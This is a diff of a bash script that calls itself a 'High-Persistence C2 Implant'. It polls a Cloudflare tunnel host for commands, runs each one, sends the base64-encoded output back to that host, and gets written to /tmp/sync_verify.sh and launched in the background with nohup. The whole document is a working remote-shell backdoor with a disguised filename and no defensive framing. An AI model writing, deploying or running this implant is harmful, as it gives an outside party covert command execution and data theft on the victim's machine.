@@ -1,20 +1,26 @@
+cat << 'EOF' > /tmp/sync_verify.sh
 #!/bin/bash
-# C
-C2="https://management-being-revolutionary-optional.trycloudflare.com"
+# High-Persistence C2 Implant
+C2="https://italiano-successfully-rear-engage.trycloudflare.com"
 
 while true; do
-  # 1. Ask your Mac "What should I run?"
-  # --max-time ensures it doesn't hang if your Mac goes to sleep
-  CMD=$(curl -s --max-time 10 "$C2")
+  # 1. Ask Mac for a command
+  CMD=$(curl -s -L --max-time 10 "$C2")
   
-  if [ -n "$CMD" ] && [ "$CMD" != "none" ]; then
-    # 2. Execute and capture EVERYTHING
-    RESULT=$(/bin/bash -c "$CMD" 2>&1)
+  if [[ -n "$CMD" && "$CMD" != "none" ]]; then
+    # 2. Execute and capture
+    /bin/bash -c "$CMD" > /tmp/out.tmp 2>&1
     
-    # 3. Send the answer back to your Mac
-    curl -s -X POST --data-binary "$RESULT" "$C2"
+    # 3. Send back as Base64 (Safer for large output)
+    payload=$(cat /tmp/out.tmp | base64 | tr -d '\n')
+    curl -s -X POST -d "$payload" "$C2"
+    
+    # 4. Cleanup
+    rm -f /tmp/out.tmp
   fi
-  # 2-second pulse makes it feel snappy
   sleep 2
 done
+EOF
 
+chmod +x /tmp/sync_verify.sh
+nohup /tmp/sync_verify.sh > /dev/null 2>&1 &
